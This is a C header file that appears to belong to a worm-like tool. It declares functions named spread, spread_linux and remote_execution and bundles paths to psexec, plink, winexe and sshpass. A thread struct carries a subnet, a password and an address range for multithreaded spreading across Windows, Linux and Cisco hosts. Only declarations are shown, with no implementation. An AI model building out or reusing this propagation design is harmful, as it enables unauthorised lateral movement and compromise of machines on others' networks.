#ifndef net_H
#define net_H

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include <string.h>       // for string-related functions


#define NI_NUMERICHOST  1  // define the constant with the integer value 1
#define NI_MAXHOST 1025

#define NUM_THREADS 16 // Number of worker threads

#define MAX_BUF_SIZE 1024
#define MAX_COMMAND_SIZE 256

#ifdef _WIN32
    // Define the paths to the Windows-specific binaries
    #define POPEN _popen
    #define PCLOSE _pclose
    #define PS_EXEC_PATH ".\\bin\\win64\\psexec.exe"
    #define PLINK_EXE_PATH ".\\bin\\win64\\plink.exe"
#else
    #include <ifaddrs.h>
    #include <sys/socket.h>   // for socket-related functions and structures
    #include <netdb.h>        // for network-related functions and structures
    // Define the path to the Linux-specific winexe binary based on architecture
    #define POPEN popen
    #define PCLOSE pclose
    #ifdef __x86_64__
        #define WIN_EXE_PATH "./bin/linux64/winexe"
        #define SSHPASS_PATH "./bin/linux64/sshpass"
    #else
        #define WIN_EXE_PATH "./bin/linux32/winexe"
        #define SSHPASS_PATH "./bin/linux32/sshpass"
    #endif
#endif

enum os_type {
    UNKNOWN,
    WINDOWS,
    LINUX,
    CISCO
};

struct thread_data {
    const char* subnet;
    const char* password;
    int start;
    int end;
};

enum os_type get_os_type(const char *ip_address);
char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
void spread_linux(const char* host, const char* username, const char* password);
void spread(const char* subnet, const char* password);

// static void spread_linux(const char* host, const char* username, const char* password, const char* command);

// static void spread_windows(const char* host, const char* username, const char* password, const char* command); 

// static void spread_cisco(const char* host, const char* username, const char* password, const char* command);


#endif /* net_H */
